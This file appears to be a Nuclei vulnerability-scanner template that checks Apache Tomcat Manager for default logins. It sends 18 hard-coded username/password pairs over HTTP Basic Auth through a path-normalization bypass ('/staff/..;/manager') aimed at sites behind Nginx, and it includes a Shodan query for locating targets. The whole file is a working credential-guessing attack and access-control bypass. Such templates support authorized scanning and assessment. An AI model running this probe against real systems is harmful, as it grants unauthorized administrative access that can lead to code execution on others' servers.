http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Apache Tomcat
    - Server Information
  - condition: or
    part: body
    type: word
    words:
    - Tomcat Version
    - JVM Version
    - JVM Vendor
    - OS Name
    - OS Version
    - OS Architecture
    - Hostname
    - IP Address
  - status:
    - 200
    type: status
  - negative: true
    part: body
    type: word
    words:
    - 401 Unauthorized
  matchers-condition: and
  payloads:
    password:
    - tomcat
    - admin
    - OvW*busr1
    - j2deployer
    - kdsxc
    - ADMIN
    - xampp
    - s3cret
    - QLogic66
    - tomcat
    - root
    - role1
    - changethis
    - changethis
    - j5Brn9
    - tomcat
    - tomcat
    - 123456
    username:
    - tomcat
    - admin
    - ovwebusr
    - j2deployer
    - cxsdk
    - ADMIN
    - xampp
    - tomcat
    - QCC
    - admin
    - root
    - role1
    - role
    - tomcat
    - admin
    - role1
    - both
    - admin
  raw:
  - 'GET /staff/..;/manager HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
  stop-at-first-match: true
id: tomcat-default-login-normalization
info:
  author: pdteam,sinKettu,reewardius
  description: Apache Tomcat Manager default login credentials were discovered. This
    template checks for multiple variations.
  metadata:
    max-request: 18
    shodan-query: title:"Apache Tomcat"
  name: Apache Tomcat Manager Default Login via Nginx Normalization
  reference:
  - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
  - https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/tomcat_jsp_upload_bypass
  severity: high
  tags: java,apache,default-login,tomcat
